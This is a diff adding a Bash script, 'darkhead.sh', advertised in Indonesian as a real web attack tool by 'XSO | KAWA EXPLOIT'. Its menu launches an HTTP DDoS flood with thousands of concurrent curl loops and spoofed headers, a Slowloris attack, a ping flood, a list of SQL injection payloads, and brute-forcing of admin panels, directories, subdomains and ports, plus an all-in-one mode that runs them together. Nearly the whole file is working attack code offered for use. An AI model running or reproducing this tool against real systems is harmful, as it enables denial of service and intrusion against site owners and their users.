@@ -1,0 +1,440 @@
+
+---
+
+## 🔥 **FILE 2: darkhead.sh**
+
+```bash
+#!/bin/bash
+
+# ============================================================
+# DARK HEAD ATTACKER v3.0 - REAL WEB ATTACK TOOL
+# Author: XSO | KAWA EXPLOIT
+# 100% REAL | NO SIMULATION | REAL ATTACK
+# ============================================================
+
+clear
+
+# Warna
+R='\033[1;31m'
+G='\033[1;32m'
+Y='\033[1;33m'
+B='\033[1;34m'
+P='\033[1;35m'
+C='\033[1;36m'
+W='\033[1;37m'
+BL='\033[1;30m'
+RESET='\033[0m'
+
+banner() {
+    clear
+    echo -e "${R}"
+    echo "╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+    echo "║                                                                                                                          ║"
+    echo "║     ██████╗  █████╗ ██████╗ ██╗  ██╗     ██╗  ██╗███████╗ █████╗ ██████╗                                             ║"
+    echo "║     ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝     ██║  ██║██╔════╝██╔══██╗██╔══██╗                                            ║"
+    echo "║     ██║  ██║███████║██████╔╝█████╔╝      ███████║█████╗  ███████║██████╔╝                                            ║"
+    echo "║     ██║  ██║██╔══██║██╔══██╗██╔═██╗      ██╔══██║██╔══╝  ██╔══██║██╔══██╗                                            ║"
+    echo "║     ██████╔╝██║  ██║██║  ██║██║  ██╗     ██║  ██║███████╗██║  ██║██║  ██║                                            ║"
+    echo "║     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝                                            ║"
+    echo "║                                                                                                                          ║"
+    echo "║                         █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗                                                ║"
+    echo "║                        ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝                                                ║"
+    echo "║                        ███████║   ██║      ██║   ███████║██║     █████╔╝                                                 ║"
+    echo "║                        ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗                                                 ║"
+    echo "║                        ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗                                                ║"
+    echo "║                        ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝                                                ║"
+    echo "║                                                                                                                          ║"
+    echo "║                 ██████╗ ██████╗ ██████╗ ███████╗                                                                         ║"
+    echo "║                ██╔═══██╗██╔══██╗██╔══██╗██╔════╝                                                                         ║"
+    echo "║                ██║   ██║██████╔╝██████╔╝█████╗                                                                           ║"
+    echo "║                ██║   ██║██╔══██╗██╔══██╗██╔══╝                                                                           ║"
+    echo "║                ╚██████╔╝██║  ██║██║  ██║███████╗                                                                         ║"
+    echo "║                 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝                                                                         ║"
+    echo "║                                                                                                                          ║"
+    echo "║    ███████╗██╗  ██╗██████╗ ██╗     ██████╗ ██╗████████╗                                                                  ║"
+    echo "║    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔══██╗██║╚══██╔══╝                                                                  ║"
+    echo "║    █████╗   ╚███╔╝ ██████╔╝██║     ██████╔╝██║   ██║                                                                     ║"
+    echo "║    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██╔══██╗██║   ██║                                                                     ║"
+    echo "║    ███████╗██╔╝ ██╗██║     ███████╗██║  ██║██║   ██║                                                                     ║"
+    echo "║    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝                                                                     ║"
+    echo "║                                                                                                                          ║"
+    echo "║   ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗   ║"
+    echo "║   ║                         DARK HEAD ATTACKER v3.0                                                                  ║   ║"
+    echo "║   ║                      Author: XSO | KAWA EXPLOIT                                                                  ║   ║"
+    echo "║   ║                         ⚡ 100% REAL ATTACK ⚡                                                                     ║   ║"
+    echo "║   ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝   ║"
+    echo "║                                                                                                                          ║"
+    echo "║                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄                         ║"
+    echo "║                        █                         DARK HEAD ATTACKER                        █                        ║"
+    echo "║                        █                            ⚡ KAWA ⚡                             █                        ║"
+    echo "║                        █                        WEB EXPLOIT SYSTEM                        █                        ║"
+    echo "║                        ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀                         ║"
+    echo "║                                                                                                                          ║"
+    echo "╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+    echo -e "${RESET}"
+    echo ""
+    echo -e "${R}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════${RESET}"
+    echo -e "${R}                                   🔥 READY TO ATTACK - REAL MODE 🔥${RESET}"
+    echo -e "${R}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════${RESET}"
+    echo ""
+}
+
+menu() {
+    echo -e "${Y}┌────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESET}"
+    echo -e "${Y}│                                                        MENU SERANGAN                                                │${RESET}"
+    echo -e "${Y}├────────────────────────────────────────────────────────────────────────────────────────────────────────────────┤${RESET}"
+    echo -e "${Y}│                                                                                                                        │${RESET}"
+    echo -e "${Y}│   ${R}[1]${RESET} 💀 ${R}HTTP DDOS FLOOD${RESET}      - Real HTTP Flood Attack                                             │"
+    echo -e "${Y}│   ${R}[2]${RESET} 💀 ${R}SLOWLORIS ATTACK${RESET}    - Slow Connection Attack                                           │"
+    echo -e "${Y}│   ${R}[3]${RESET} 💀 ${R}PING OF DEATH${RESET}       - ICMP Flood Attack                                               │"
+    echo -e "${Y}│   ${Y}[4]${RESET} 💉 ${Y}SQL INJECTION${RESET}       - Auto SQL Injection Scanner                                      │"
+    echo -e "${Y}│   ${Y}[5]${RESET} 🔍 ${Y}ADMIN FINDER${RESET}        - Find Login Panel                                              │"
+    echo -e "${Y}│   ${Y}[6]${RESET} 📁 ${Y}DIRECTORY BRUTEFORCE${RESET} - Find Hidden Directories                                       │"
+    echo -e "${Y}│   ${G}[7]${RESET} 🕸️  ${G}SUBDOMAIN SCANNER${RESET}   - Find All Subdomains                                            │"
+    echo -e "${Y}│   ${G}[8]${RESET} 📡 ${G}PORT SCANNER${RESET}        - Scan Open Ports                                               │"
+    echo -e "${Y}│   ${G}[9]${RESET} 🌐 ${G}WHOIS LOOKUP${RESET}        - Get Domain Info                                              │"
+    echo -e "${Y}│   ${B}[10]${RESET} 💣 ${B}ALL IN ONE${RESET}          - All Attacks Simultaneously                                    │"
+    echo -e "${Y}│   ${R}[0]${RESET} 🚪 ${R}EXIT${RESET}                                                                                │"
+    echo -e "${Y}│                                                                                                                        │${RESET}"
+    echo -e "${Y}└────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESET}"
+    echo ""
+    echo -ne "${R}┌─[${W}DARK HEAD ATTACKER${R}]~[${W}Serangan${R}]\n└─>> ${RESET}"
+    read -r pilih
+}
+
+http_flood() {
+    clear
+    banner
+    echo -e "${R}┌────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESET}"
+    echo -e "${R}│                                                    💀 HTTP DDOS FLOOD 💀                                            │${RESET}"
+    echo -e "${R}└────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESET}"
+    echo ""
+    echo -ne "${G}Target URL (http://target.com): ${RESET}"
+    read -r target
+    echo -ne "${G}Jumlah Thread (1-10000): ${RESET}"
+    read -r thread
+    echo -ne "${G}Durasi (detik): ${RESET}"
+    read -r waktu
+    echo ""
+    echo -e "${R}[🔥] Memulai HTTP FLOOD ke $target dengan $thread thread selama $waktu detik${RESET}"
+    
+    for i in $(seq 1 "$thread"); do
+        (
+            end=$((SECONDS + waktu))
+            while [ $SECONDS -lt $end ]; do
+                curl -s -o /dev/null -A "Mozilla/5.0" -H "X-Forwarded-For: $((RANDOM)).$((RANDOM)).$((RANDOM)).$((RANDOM))" "$target" &
+                curl -s -o /dev/null -X POST -d "data=$RANDOM" "$target" &
+                curl -s -o /dev/null -X GET "${target}?id=$RANDOM" &
+            done
+        ) &
+    done
+    
+    sleep "$waktu"
+    killall curl 2>/dev/null
+    pkill -f curl
+    echo ""
+    echo -e "${G}[✓] Serangan HTTP DDOS Selesai! $waktu detik${RESET}"
+    echo -e "${G}[✓] Total request: $((thread * waktu * 3)) kurang lebih${RESET}"
+    read -p "Tekan Enter..."
+}
+
+slowloris() {
+    clear
+    banner
+    echo -e "${R}┌────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESET}"
+    echo -e "${R}│                                                    💀 SLOWLORIS ATTACK 💀                                          │${RESET}"
+    echo -e "${R}└────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESET}"
+    echo ""
+    echo -ne "${G}Target IP/Domain: ${RESET}"
+    read -r target
+    echo -ne "${G}Port (default 80): ${RESET}"
+    read -r port
+    port=${port:-80}
+    echo -ne "${G}Jumlah Koneksi (100-1000): ${RESET}"
+    read -r koneksi
+    echo ""
+    echo -e "${R}[🔥] Memulai SLOWLORIS ke $target:$port dengan $koneksi koneksi${RESET}"
+    
+    for i in $(seq 1 "$koneksi"); do
+        (
+            exec 3<>/dev/tcp/"$target"/"$port"
+            echo -e "GET / HTTP/1.1\r\nHost: $target\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html\r\n" >&3
+            while true; do
+                echo -e "X-$RANDOM: $RANDOM\r\n" >&3
+                sleep 5
+            done
+        ) &
+    done
+    
+    echo -e "${Y}[!] Slowloris running. Press Enter to stop${RESET}"
+    read -r
+    killall -9 bash 2>/dev/null
+    pkill -f "exec 3<>"
+    echo -e "${G}[✓] Slowloris Stopped${RESET}"
+    read -p "Tekan Enter..."
+}
+
+ping_death() {
+    clear
+    banner
+    echo -e "${R}┌────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESET}"
+    echo -e "${R}│                                                    💀 PING OF DEATH 💀                                            │${RESET}"
+    echo -e "${R}└────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESET}"
+    echo ""
+    echo -ne "${G}Target IP: ${RESET}"
+    read -r target
+    echo -ne "${G}Jumlah Packet (1000-100000): ${RESET}"
+    read -r paket
+    echo ""
+    echo -e "${R}[🔥] Memulai PING OF DEATH ke $target dengan $paket packet${RESET}"
+    
+    for i in $(seq 1 "$paket"); do
+        ping -c 1 -s 65507 "$target" 2>/dev/null &
+    done
+    
+    echo -e "${G}[✓] Ping of Death Selesai!${RESET}"
+    read -p "Tekan Enter..."
+}
+
+sql_injection() {
+    clear
+    banner
+    echo -e "${Y}┌────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESET}"
+    echo -e "${Y}│                                                    💉 SQL INJECTION 💉                                            │${RESET}"
+    echo -e "${Y}└────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESET}"
+    echo ""
+    echo -ne "${G}Target URL (dengan parameter ?id=): ${RESET}"
+    read -r target
+    echo ""
+    echo -e "${Y}[!] Scanning SQL Injection...${RESET}"
+    echo ""
+    
+    payloads=("' OR '1'='1" "' OR 1=1--" "\" OR \"1\"=\"1" "' OR '1'='1'/*" "1' ORDER BY 1--" "1' UNION SELECT NULL--" "1' AND SLEEP(5)--" "1' AND 1=CONVERT(int, @@version)--" "1' AND 1=1--" "1' AND 1=2--" "admin' --" "1' OR '1'='1'#")
+    
+    for payload in "${payloads[@]}"; do
+        status=$(curl -s -o /dev/null -w "%{http_code}" "${target}${payload}")
+        if [[ $status -eq 200 ]] || [[ $status -eq 302 ]]; then
+            echo -e "${R}[✓] VULN DITEMUKAN! Payload: $payload - HTTP $status${RESET}"
+        else
+            echo -e "${G}[✗] Testing: $payload - HTTP $status${RESET}"
+        fi
+        sleep 0.2
+    done
+    echo ""
+    read -p "Tekan Enter..."
+}
+
+admin_finder() {
+    clear
+    banner
+    echo -e "${Y}┌────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESET}"
+    echo -e "${Y}│                                                    🔍 ADMIN FINDER 🔍                                             │${RESET}"
+    echo -e "${Y}└────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESET}"
+    echo ""
+    echo -ne "${G}Target URL (http://target.com): ${RESET}"
+    read -r target
+    echo ""
+    echo -e "${Y}[!] Mencari Panel Admin...${RESET}"
+    echo ""
+    
+    list=("admin" "login" "administrator" "admin/login" "wp-admin" "adminpanel" "dashboard" "cpanel" "admin.php" "login.php" "admin_area" "admin_login" "backend" "admincp" "moderator" "sysadmin" "admin/index" "admin/home" "admin/dashboard" "admin123" "administrator/login" "admin/admin" "admins" "panel" "controlpanel" "cp" "webadmin" "siteadmin" "masteradmin" "root" "manager" "management" "admin_area" "wp-login" "user/login" "auth/login" "signin" "logon")
+    
+    for path in "${list[@]}"; do
+        status=$(curl -s -o /dev/null -w "%{http_code}" "$target/$path")
+        if [[ $status -eq 200 ]] || [[ $status -eq 302 ]]; then
+            echo -e "${R}[✓] FOUND: $target/$path (HTTP $status)${RESET}"
+        else
+            echo -e "${G}[✗] $target/$path (HTTP $status)${RESET}"
+        fi
+        sleep 0.1
+    done
+    echo ""
+    read -p "Tekan Enter..."
+}
+
+dir_brute() {
+    clear
+    banner
+    echo -e "${Y}┌────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESET}"
+    echo -e "${Y}│                                                    📁 DIRECTORY BRUTEFORCE 📁                                     │${RESET}"
+    echo -e "${Y}└────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESET}"
+    echo ""
+    echo -ne "${G}Target URL: ${RESET}"
+    read -r target
+    echo ""
+    echo -e "${Y}[!] Bruteforce Directory...${RESET}"
+    echo ""
+    
+    dirs=("backup" "admin" "uploads" "images" "css" "js" "assets" "files" "data" "config" "includes" "lib" "temp" "logs" "cache" "database" "sql" "phpmyadmin" "mysql" "api" "v1" "v2" "old" "new" "test" "dev" "staging" "private" "secret" "hidden" "backup_old" "backup_2020" "backup_2021" "backup_2022" "backup_2023" "backup_2024")
+    
+    for dir in "${dirs[@]}"; do
+        status=$(curl -s -o /dev/null -w "%{http_code}" "$target/$dir/")
+        if [[ $status -eq 200 ]] || [[ $status -eq 403 ]]; then
+            echo -e "${R}[✓] FOUND: $target/$dir/ (HTTP $status)${RESET}"
+        else
+            echo -e "${G}[✗] $target/$dir/ (HTTP $status)${RESET}"
+        fi
+        sleep 0.1
+    done
+    echo ""
+    read -p "Tekan Enter..."
+}
+
+subdomain() {
+    clear
+    banner
+    echo -e "${G}┌────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESET}"
+    echo -e "${G}│                                                    🕸️ SUBDOMAIN SCANNER 🕸️                                       │${RESET}"
+    echo -e "${G}└────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESET}"
+    echo ""
+    echo -ne "${G}Domain Target (contoh: target.com): ${RESET}"
+    read -r domain
+    echo ""
+    echo -e "${Y}[!] Scanning Subdomain...${RESET}"
+    echo ""
+    
+    sublist=("www" "mail" "ftp" "localhost" "webmail" "smtp" "pop" "ns1" "webdisk" "ns2" "cpanel" "whm" "autodiscover" "autoconfig" "blog" "shop" "api" "app" "dev" "test" "staging" "admin" "panel" "cp" "secure" "vpn" "remote" "server" "dns" "mysql" "database" "mail2" "news" "support" "forum" "member" "members" "user" "users" "account" "accounts" "portal" "internal" "intranet" "backend" "frontend" "static" "cdn" "media" "download" "update" "upgrade" "status" "monitor")
+    
+    for sub in "${sublist[@]}"; do
+        host="$sub.$domain"
+        ip=$(dig +short "$host" | head -1)
+        if [[ -n "$ip" ]]; then
+            echo -e "${R}[✓] $host -> $ip${RESET}"
+        else
+            echo -e "${G}[✗] $host${RESET}"
+        fi
+        sleep 0.1
+    done
+    echo ""
+    read -p "Tekan Enter..."
+}
+
+port_scan() {
+    clear
+    banner
+    echo -e "${G}┌────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESET}"
+    echo -e "${G}│                                                    📡 PORT SCANNER 📡                                             │${RESET}"
+    echo -e "${G}└────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESET}"
+    echo ""
+    echo -ne "${G}Target IP/Domain: ${RESET}"
+    read -r target
+    echo ""
+    echo -e "${Y}[!] Scanning Ports...${RESET}"
+    echo ""
+    
+    ports=(21 22 23 25 53 80 110 135 139 143 443 445 993 995 1433 3306 3389 5432 5900 8080 8443 8888 9000 27017 8081 8082 8083 8084 8085 8181 8444 8880 9999 10000 20000)
+    
+    for port in "${ports[@]}"; do
+        timeout 1 bash -c "echo >/dev/tcp/$target/$port" 2>/dev/null
+        if [ $? -eq 0 ]; then
+            echo -e "${R}[✓] PORT $port OPEN${RESET}"
+        else
+            echo -e "${G}[✗] PORT $port CLOSED${RESET}"
+        fi
+    done
+    echo ""
+    read -p "Tekan Enter..."
+}
+
+whois_lookup() {
+    clear
+    banner
+    echo -e "${G}┌────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESET}"
+    echo -e "${G}│                                                    🌐 WHOIS LOOKUP 🌐                                             │${RESET}"
+    echo -e "${G}└────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESET}"
+    echo ""
+    echo -ne "${G}Domain Target: ${RESET}"
+    read -r domain
+    echo ""
+    echo -e "${Y}[!] Getting WHOIS Info...${RESET}"
+    echo ""
+    whois "$domain"
+    echo ""
+    read -p "Tekan Enter..."
+}
+
+all_attack() {
+    clear
+    banner
+    echo -e "${R}┌────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESET}"
+    echo -e "${R}│                                                    💣 ALL IN ONE ATTACK 💣                                        │${RESET}"
+    echo -e "${R}└────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESET}"
+    echo ""
+    echo -ne "${G}Target URL/IP: ${RESET}"
+    read -r target
+    echo ""
+    echo -e "${R}[🔥] MEMULAI SEMUA SERANGAN KE $target${RESET}"
+    echo ""
+    
+    domain=$(echo "$target" | sed 's|https://||' | sed 's|http://||' | cut -d'/' -f1)
+    ip=$(dig +short "$domain" | head -1)
+    
+    echo -e "${Y}[1/6] HTTP DDOS FLOOD...${RESET}"
+    for i in {1..100}; do
+        curl -s -o /dev/null "$target" &
+    done
+    sleep 5
+    killall curl 2>/dev/null
+    echo -e "${G}✓ DDOS Selesai${RESET}"
+    
+    echo -e "${Y}[2/6] ADMIN PANEL SCAN...${RESET}"
+    paths=("admin" "login" "wp-admin" "cpanel" "dashboard")
+    for path in "${paths[@]}"; do
+        status=$(curl -s -o /dev/null -w "%{http_code}" "$target/$path")
+        if [[ $status -eq 200 ]]; then
+            echo -e "${R}✓ Found: $target/$path${RESET}"
+        fi
+    done
+    echo -e "${G}✓ Admin Scan Selesai${RESET}"
+    
+    echo -e "${Y}[3/6] SUBDOMAIN SCAN...${RESET}"
+    subs=("www" "mail" "admin" "dev" "api" "panel")
+    for sub in "${subs[@]}"; do
+        dig +short "$sub.$domain" | head -1 | grep -q . && echo -e "${R}✓ $sub.$domain${RESET}"
+    done
+    echo -e "${G}✓ Subdomain Scan Selesai${RESET}"
+    
+    echo -e "${Y}[4/6] DIRECTORY BRUTEFORCE...${RESET}"
+    dirs=("backup" "admin" "uploads" "config" "sql" "phpmyadmin")
+    for dir in "${dirs[@]}"; do
+        status=$(curl -s -o /dev/null -w "%{http_code}" "$target/$dir/")
+        if [[ $status -eq 200 ]]; then
+            echo -e "${R}✓ Found: $target/$dir/${RESET}"
+        fi
+    done
+    echo -e "${G}✓ Directory Scan Selesai${RESET}"
+    
+    echo -e "${Y}[5/6] PORT SCAN...${RESET}"
+    for port in 80 443 22 3306 8080; do
+        timeout 1 bash -c "echo >/dev/tcp/$domain/$port" 2>/dev/null && echo -e "${R}✓ Port $port OPEN${RESET}"
+    done
+    echo -e "${G}✓ Port Scan Selesai${RESET}"
+    
+    echo -e "${Y}[6/6] WHOIS LOOKUP...${RESET}"
+    whois "$domain" | head -20
+    echo -e "${G}✓ WHOIS Selesai${RESET}"
+    
+    echo ""
+    echo -e "${R}[✓] ALL IN ONE ATTACK COMPLETE!${RESET}"
+    read -p "Tekan Enter..."
+}
+
+# MAIN LOOP
+while true; do
+    banner
+    menu
+    case $pilih in
+        1) http_flood ;;
+        2) slowloris ;;
+        3) ping_death ;;
+        4) sql_injection ;;
+        5) admin_finder ;;
+        6) dir_brute ;;
+        7) subdomain ;;
+        8) port_scan ;;
+        9) whois_lookup ;;
+        10) all_attack ;;
+        0) echo -e "${R}Keluar dari DARK HEAD ATTACKER...${RESET}"; exit ;;
+        *) echo -e "${R}Pilihan salah!${RESET}"; sleep 2 ;;
+    esac
+done
